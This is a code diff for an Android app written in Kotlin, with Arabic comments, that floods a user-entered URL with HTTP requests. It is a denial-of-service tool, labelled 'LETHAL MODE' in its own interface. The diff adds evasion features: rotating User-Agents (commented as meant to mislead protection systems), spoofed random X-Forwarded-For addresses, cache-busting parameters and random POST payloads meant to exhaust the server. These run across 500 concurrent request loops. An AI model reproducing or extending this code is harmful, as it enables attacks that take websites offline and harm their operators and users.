@@ -8,7 +8,10 @@ import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 import kotlinx.coroutines.*
 import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.util.*
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
 
@@ -20,16 +23,23 @@ class MainActivity : AppCompatActivity() {
     private val failCount = AtomicInteger(0)
     private var startTime: Long = 0
     
-    // زيادة عدد المسارات بشكل كبير للوصول لأقصى طاقة
     private val threadCount = 500 
 
-    // إعداد عميل OkHttp محسن للسرعة القصوى
+    // قائمة User-Agents متنوعة لتضليل أنظمة الحماية
+    private val userAgents = listOf(
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
+    )
+
     private val client = OkHttpClient.Builder()
-        .connectionPool(ConnectionPool(500, 5, TimeUnit.MINUTES))
-        .connectTimeout(500, TimeUnit.MILLISECONDS)
-        .readTimeout(500, TimeUnit.MILLISECONDS)
-        .writeTimeout(500, TimeUnit.MILLISECONDS)
-        .retryOnConnectionFailure(false) // تعطيل الإعادة لتوفير الوقت
+        .connectionPool(ConnectionPool(1000, 10, TimeUnit.MINUTES))
+        .connectTimeout(1, TimeUnit.SECONDS)
+        .readTimeout(1, TimeUnit.SECONDS)
+        .writeTimeout(1, TimeUnit.SECONDS)
+        .retryOnConnectionFailure(true)
         .build()
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -49,12 +59,12 @@ class MainActivity : AppCompatActivity() {
                 val targetUrl = urlInput.text.toString()
                 if (targetUrl.isNotEmpty() && (targetUrl.startsWith("http://") || targetUrl.startsWith("https://"))) {
                     isAttacking = true
-                    startBtn.text = "STOP ATTACK"
-                    startBtn.setBackgroundColor(Color.parseColor("#333333"))
-                    statusLabel.text = "STATUS: ULTRA ATTACK LIVE"
+                    startBtn.text = "STOP LETHAL ATTACK"
+                    startBtn.setBackgroundColor(Color.DKGRAY)
+                    statusLabel.text = "STATUS: LETHAL MODE ACTIVE"
                     statusLabel.setTextColor(Color.parseColor("#FF0000"))
                     
-                    startUltraAttack(targetUrl, successText, failText, totalText, speedText)
+                    startLethalAttack(targetUrl, successText, failText, totalText, speedText)
                 } else {
                     statusLabel.text = "ERROR: INVALID URL"
                     statusLabel.setTextColor(Color.RED)
@@ -70,7 +80,7 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun startUltraAttack(
+    private fun startLethalAttack(
         targetUrl: String, 
         successView: TextView, 
         failView: TextView, 
@@ -81,32 +91,50 @@ class MainActivity : AppCompatActivity() {
         failCount.set(0)
         startTime = System.currentTimeMillis()
         val scope = CoroutineScope(Dispatchers.IO)
+        val random = Random()
         
-        val request = Request.Builder()
-            .url(targetUrl)
-            .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-            .header("Cache-Control", "no-cache")
-            .header("Connection", "keep-alive")
-            .build()
-
         repeat(threadCount) {
             val job = scope.launch {
                 while (isActive && isAttacking) {
-                    client.newCall(request).enqueue(object : Callback {
-                        override fun onFailure(call: Call, e: IOException) {
-                            failCount.incrementAndGet()
+                    try {
+                        // توليد Payload عشوائي لإجهاد الخادم
+                        val randomPayload = UUID.randomUUID().toString() + " " + System.currentTimeMillis()
+                        val body = randomPayload.toRequestBody("text/plain".toMediaType())
+                        
+                        // اختيار نوع الطلب عشوائياً (GET أو POST)
+                        val requestBuilder = Request.Builder()
+                            .url(targetUrl + "?v=" + random.nextInt(1000000)) // منع الـ Caching
+                            .header("User-Agent", userAgents.random())
+                            .header("X-Forwarded-For", "${random.nextInt(255)}.${random.nextInt(255)}.${random.nextInt(255)}.${random.nextInt(255)}")
+                            .header("Cache-Control", "no-cache, no-store, must-revalidate")
+                            .header("Pragma", "no-cache")
+                            .header("Expires", "0")
+
+                        if (random.nextBoolean()) {
+                            requestBuilder.post(body)
+                        } else {
+                            requestBuilder.get()
                         }
 
-                        override fun onResponse(call: Call, response: Response) {
-                            if (response.isSuccessful) {
-                                successCount.incrementAndGet()
-                            } else {
+                        val request = requestBuilder.build()
+
+                        client.newCall(request).enqueue(object : Callback {
+                            override fun onFailure(call: Call, e: IOException) {
                                 failCount.incrementAndGet()
                             }
-                            response.close() // ضروري جداً لتحرير الموارد فوراً
-                        }
-                    })
-                    // تأخير ضئيل جداً لمنع انهيار التطبيق فوراً (يمكن تقليله حسب قوة الجهاز)
+
+                            override fun onResponse(call: Call, response: Response) {
+                                if (response.isSuccessful) {
+                                    successCount.incrementAndGet()
+                                } else {
+                                    failCount.incrementAndGet()
+                                }
+                                response.close()
+                            }
+                        })
+                    } catch (e: Exception) {
+                        failCount.incrementAndGet()
+                    }
                     delay(1) 
                 }
             }
@@ -134,7 +162,6 @@ class MainActivity : AppCompatActivity() {
     private fun stopAttack() {
         attackJobs.forEach { it.cancel() }
         attackJobs.clear()
-        // إلغاء جميع الطلبات المعلقة في OkHttp
         client.dispatcher.cancelAll()
     }
 }
